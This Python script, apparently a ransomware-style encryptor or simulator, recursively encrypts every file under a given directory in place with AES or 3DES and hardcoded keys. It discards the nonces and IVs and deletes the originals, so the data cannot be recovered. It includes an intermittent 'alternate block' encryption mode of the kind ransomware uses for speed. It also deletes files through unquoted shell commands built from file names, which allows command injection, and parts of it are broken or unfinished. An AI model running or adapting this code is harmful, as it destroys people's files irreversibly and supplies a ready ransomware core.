#!/usr/local/bin/python3

import base64
import argparse
import logging
import glob
import os
import io
import PIL.Image as Image
import math
import numpy as np
import sys
import time
import itertools
import tqdm
import gc

from array import array

EXPAND_BUFFER_BEFORE_ENCRYPTION = True
CUTOFF_SIZE = 1024 + 512

def free_memory():
    gc.collect(0)
    gc.collect(1)
    gc.collect(2)
    gc.collect(0)
    gc.collect(1)
    gc.collect(2)

from Cryptodome.Cipher import AES, DES3

from hashlib import md5

password = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
BLOCK_SIZE = 16

EXTREMITY_SIZE = (128 // 2)

def readimage(path):
    with open(path, "rb") as f:
        thebytes = bytearray(f.read())
        if EXPAND_BUFFER_BEFORE_ENCRYPTION:
            while len(thebytes) < CUTOFF_SIZE:
                thebytes = thebytes + thebytes
        return thebytes

def pad (data):
    pad = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data

def unpad (padded):
    pad = ord(padded[-1])
    return padded[:-pad]

def encrypt_buffer(data, nonce, password):
    t1 = time.perf_counter()
    key = b'Sixteen byte key'
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    #print(f"Encryption time: {time.perf_counter() - t1} s")
    return ciphertext

def encrypt_buffer_des3(data, nonce, password):
    key = b'123456789012345678901234'
    while 0 != len(data) % 8:
        data = data + b'a'
    key = DES3.adjust_key_parity(key)
    cipher = DES3.new(key, DES3.MODE_CBC)
    ciphertext = cipher.encrypt(data)
    return ciphertext


def encrypt_full_file(filename):
    if os.path.isfile(filename):
        encrypted_buffer = encrypt_buffer(readimage(filename), "", password)
        output_filename = f"{filename}.out"
        with open (output_filename, "wb") as f:
            f.write(encrypted_buffer)
            f.close()
        os.system(f"rm {filename}")
        os.system(f"mv {output_filename} {filename}")
        #print(f"Encrypted {filename}")
    return {filename: True}

def encrypt_full_file_des3(filename):
    if os.path.isfile(filename):
        encrypted_buffer = encrypt_buffer_des3(readimage(filename), "", password)
        output_filename = f"{filename}.out"
        with open (output_filename, "wb") as f:
            f.write(encrypted_buffer)
            f.close()
        os.system(f"rm {filename}")
        os.system(f"mv {output_filename} {filename}")
        #print(f"Encrypted {filename}")
    return {filename: True}

def encrypt_des3_full_file(filename):
    if os.path.isfile(filename):
        encrypt_


def encrypt_file_alternate_blocksv2_unopt(block_size):
    """
        Do not encrypt the first 128 bytes
        Do not encrypt the last 128 bytes
        For the remaining bytes, encrypt every alternate
        every alternate 16 bytes (or block size bytes)
    """
    def encrypt_fn(filename):
        #print(f"Encrypting {filename} : {EXTREMITY_SIZE} {BLOCK_SIZE}")
        if not os.path.exists(filename) or not os.path.isfile(filename):
            return

        plainbuffer = readimage(filename)
        tempbuffer = plainbuffer

        # If the buffer is too small, increase it's size
        while len(tempbuffer) < 1024 + 2 * EXTREMITY_SIZE:
            tempbuffer += plainbuffer
        plainbuffer = tempbuffer

        # Store the tail and head in different buffers
        head_buffer = plainbuffer[:EXTREMITY_SIZE]
        tail_buffer = plainbuffer[-EXTREMITY_SIZE:]

        # Now chop off the tail and the head
        plainbuffer = plainbuffer[EXTREMITY_SIZE:]
        plainbuffer = plainbuffer[:-EXTREMITY_SIZE]

        # The remaininb buffer, chop it into two equal parts
        # with every alternate 16byte chunk going into 
        # either side
        buffer_for_encryption = b''
        buffer_plain_noencrypt = b''
        while len(plainbuffer) > 0:
            buf = plainbuffer[:block_size]
            plainbuffer = plainbuffer[block_size:]
            buffer_for_encryption += buf
            if len(plainbuffer) == 0:
                break
            buf = plainbuffer[:block_size]
            plainbuffer = plainbuffer[block_size:]
            buffer_plain_noencrypt += buf

        # Now encrypt the part we want to encrypt
        buffer_for_encryption = encrypt_buffer(buffer_for_encryption, "", password)

        # Now put the two split bytes back together
        out_buffer = b''
        while len(buffer_for_encryption) > 0 or len(buffer_plain_noencrypt) > 0:
            if len(buffer_for_encryption) > 0:
                out_buffer += buffer_for_encryption[:block_size]
                buffer_for_encryption = buffer_for_encryption[block_size:]
            if len(buffer_plain_noencrypt) > 0:
                out_buffer += buffer_plain_noencrypt[:block_size]
                buffer_plain_noencrypt = buffer_plain_noencrypt[block_size:]
        out_buffer = head_buffer + out_buffer + tail_buffer

        try:
            output_filename = f"{filename}.out"
            with open(output_filename, "wb") as f:
                f.write(out_buffer)
            os.unlink(filename)
            os.rename(output_filename, filename)
        except Exception as e:
            raise e

    return encrypt_fn

def encrypt_file_alternate_blocksv2_opt(block_size):
    def encrypt_fn(filename):
        if not os.path.exists(filename) or not os.path.isfile(filename):
            return

        plainbuffer = readimage(filename)
        tempbuffer = plainbuffer
        # If the buffer is too small, increase it's size
        while len(tempbuffer) < 1024 + 2 * EXTREMITY_SIZE:
            tempbuffer += plainbuffer
        plainbuffer = tempbuffer
        tempbuffer = None
        
        while len(plainbuffer) % EXTREMITY_SIZE != 0:
            plainbuffer += plainbuffer[-1:]

        # Store the tail and head in different buffers
        head_buffer = plainbuffer[:EXTREMITY_SIZE]
        tail_buffer = plainbuffer[-EXTREMITY_SIZE:]

        # Now chop off the tail and the head
        plainbuffer = plainbuffer[EXTREMITY_SIZE:]
        plainbuffer = plainbuffer[:-EXTREMITY_SIZE]

        npbuffer = np.frombuffer(plainbuffer, np.uint8)
        npbuffer = npbuffer.reshape(\
            (npbuffer.shape[0] // block_size, block_size))

        even_npbuffer = npbuffer[::2,:]
        odd_npbuffer = npbuffer[1::2,:]

        # for i in range(5):
        #     print("evn: ", even_npbuffer[i,:].tobytes(), "\n")
        #     print("odd: ", odd_npbuffer[i,:].tobytes(), "\n")
        # print('-' * 80)
        # print()
        # print()

        encrypted_buffer = encrypt_buffer(odd_npbuffer.tobytes(), "", password)
        unencrypted_buffer = even_npbuffer.tobytes()


        try:
            output_filename = f"{filename}.out"
            with open(output_filename, "wb") as f:
                # First writ the head unencrypted bit
                f.write(head_buffer)

                enc_ind = 0
                unenc_ind = 0

                # Now alternatively write encrypted and unencrypted blocks
                while enc_ind < len(encrypted_buffer) \
                    or unenc_ind < len(unencrypted_buffer):

                    if unenc_ind < len(unencrypted_buffer):
                        f.write(unencrypted_buffer[\
                                    unenc_ind:unenc_ind + block_size])
                        unenc_ind += block_size

                    if enc_ind < len(encrypted_buffer):
                        f.write(encrypted_buffer[enc_ind:enc_ind + block_size])
                        enc_ind += block_size

                # Finally write the tail unencrypted buffer
                f.write(tail_buffer)
                f.close()
            os.unlink(filename)
            os.rename(output_filename, filename)
        except Exception as e:
            raise e

    return encrypt_fn

PARALLEL_JOBS = 8



#-------------------------------------------------------------------------------


def iterate_files(base_dir):
    """
        Iterate over a directory, and for every file that is not a metadata
        file, call process_single_file.

        Metadata files have the following format:
        __metadata_origfname.origextn.json
    """
    savedir = None

    encryption_fn = encrypt_full_file
    encryption_fn = encrypt_file_alternate_blocksv2_opt(BLOCK_SIZE)
    encryption_fn = encrypt_full_file_des3
    try:
        savedir = os.getcwd()
        os.chdir(base_dir)
        filenames = glob.glob("./**", recursive=True)
        for i in tqdm.tqdm(range(0, len(filenames), PARALLEL_JOBS)):
            list(map(encryption_fn, filenames[i: i + PARALLEL_JOBS]))
            free_memory()
    except Exception as e:
        logging.error(f"Exception in iteration {e}")
        raise e
    finally:
        if savedir is not None:
            os.chdir(savedir)




#-------------------------------------------------------------------------------



def main():
    parser = argparse.ArgumentParser(\
        description="Iterate files and and encrypt them")
    parser.add_argument("--directory", "-d", type=str, required=True)
    args = parser.parse_args()
    iterate_files(args.directory)



#-------------------------------------------------------------------------------



if "__main__" == __name__:
    main()
